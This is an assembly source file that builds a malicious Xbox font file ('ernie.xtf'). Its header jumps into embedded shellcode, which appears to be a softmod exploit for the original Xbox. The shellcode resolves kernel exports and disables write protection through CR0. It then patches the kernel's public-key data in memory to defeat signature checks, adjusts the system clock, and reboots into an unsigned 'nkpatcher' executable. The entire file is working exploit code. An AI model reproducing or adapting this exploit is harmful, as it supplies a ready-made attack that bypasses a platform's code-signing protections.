;;;
;;; Compile:	nasm -o ernie.xtf ernie.asm
;;;
							BITS 32
header:	
							db 'XTF0'
							dd 32
							db 'Xbox Book'
							times 32-9 db 0
.data1len:
							jmp short shellcode
							dw 10h
							dd 0
.data2num:
							dd 1		; Can be tuned (to fill memory holes) in case of exploit instability
							dd 0
shellcode:
							jmp	near start
							align 4, db 0
kexports:	
HalReturnToFirmware			dd 49
;HalWriteSMBusValue			dd 50
LaunchDataPage				dd 164
MmAllocateContiguousMemory	dd 165
MmPersistContiguousMemory	dd 178
XePublicKeyData				dd 355
KeQuerySystemTime			dd 128
NtSetSystemTime				dd 228
RtlTimeFieldsToTime			dd 304
							dd 0
mintimefields
							dw 2019		; Year
							dw 1		; Month
							dw 1		; Day
							dw 12		; Hour
							dw 0		; Minute
							dw 0		; Second
							dw 0		; Milliseconds
							dw 0		; Weekday (ignored)
maxtimefields
							dw 2099		; Year
							dw 1		; Month
							dw 1		; Day
							dw 0		; Hour
							dw 0		; Minute
							dw 0		; Second
							dw 0		; Milliseconds
							dw 0		; Weekday (ignored)
xbestr						db '\Device\Harddisk0\Partition2\nkpatcher;default.xbe',0
							times 8 db 0
XBESTRLEN					equ $-xbestr
start:
							call	base
base:
							pop	ebp
							cld
							mov	esi,80010000h	; Kernel here
							mov	eax,[esi+3Ch]
							mov	ebx,[esi+eax+78h]
							add	ebx,esi
							mov	edx,[ebx+1Ch]
							add	edx,esi
							lea	edi,[ebp+kexports-base]
getexports:	
							mov	ecx,[edi]
							jecxz	.done
							sub	ecx,[ebx+10h]
							mov	eax,[edx+4*ecx]
							test	eax,eax
							jz	.empty
							add	eax,esi
.empty:
							stosd
							jmp	getexports
.done:
; blinkled:	
;							mov	edi,[ebp+HalWriteSMBusValue-base]
;							push	0A0h
;							push	byte 0
;							push	byte 8
;							push	byte 20h
;							call	edi
;							push	byte 1
;							push	byte 0
;							push	byte 7
;							push	byte 20h
;							call	edi
patchpublickey:	
							mov	ebx,[ebp+XePublicKeyData-base]
							test	ebx,ebx
							jnz	.chk
.searchkey:	
							mov	ebx,esi
							inc	esi
.chk:
							cmp	dword [ebx],31415352h
							jne	.searchkey
							cmp	dword [ebx+10h],10001h
							jne	.searchkey
.searchkeyend:	
							inc	ebx
							cmp	dword [ebx],0A44B1BBDh
							jne	.searchkeyend
							pushf
							cli
							mov	ecx,cr0
							push	ecx
							and	ecx,0FFFEFFFFh
							mov	cr0,ecx
							xor	dword [ebx],2DD78BD6h
							pop	ecx
							mov	cr0,ecx
							popf
clockcheck:
							xor	eax,eax
							push	eax
							push	eax
							mov	ebx,esp		; space for current time
							push	eax
							push	eax
							mov	esi,esp		; space for minimum time
							push	eax
							push	eax
							mov	edi,esp		; space for maximum time
							push	ebx
							call	dword [ebp+KeQuerySystemTime-base]
							push	esi
							lea	eax,[ebp+mintimefields-base]
							push	eax
							call	dword [ebp+RtlTimeFieldsToTime-base]
							test	eax,eax
							jz	.bailout
							mov	eax,[ebx]
							mov	edx,[ebx+4]
							sub	eax,[esi]
							sbb	edx,[esi+4]
							jc	.setclock
							push	edi
							lea	eax,[ebp+maxtimefields-base]
							push	eax
							call	dword [ebp+RtlTimeFieldsToTime-base]
							test	eax,eax
							jz	.bailout
							mov	eax,[ebx]
							mov	edx,[ebx+4]
							sub	eax,[edi]
							sbb	edx,[edi+4]
							jc	.clockok
.setclock:
							push	byte 0
							push	esi
							call	dword [ebp+NtSetSystemTime-base]
.clockok:	
.bailout:	
							add	esp,byte 8+8+8
launchxbe:	
							mov	esi,[ebp+LaunchDataPage-base]
							mov	edi,1000h
							mov	ebx,[esi]
							test	ebx,ebx
							jnz	.memok
							push	edi
							call	dword [ebp+MmAllocateContiguousMemory-base]
							mov	ebx,eax
							mov	[esi],eax
.memok:	
							push	byte 1
							push	edi
							push	ebx
							call	dword [ebp+MmPersistContiguousMemory-base]
							mov	edi,ebx
							xor	eax,eax
							mov	ecx,400h
							rep	stosd
							or	dword [ebx],byte -1
							mov	[ebx+4],eax
							lea	edi,[ebx+8]
							lea	esi,[ebp+xbestr-base]
							push	byte XBESTRLEN
							pop	ecx
							rep	movsb
							push	byte 2
							call	dword [ebp+HalReturnToFirmware-base]
.inf:
							jmp	short .inf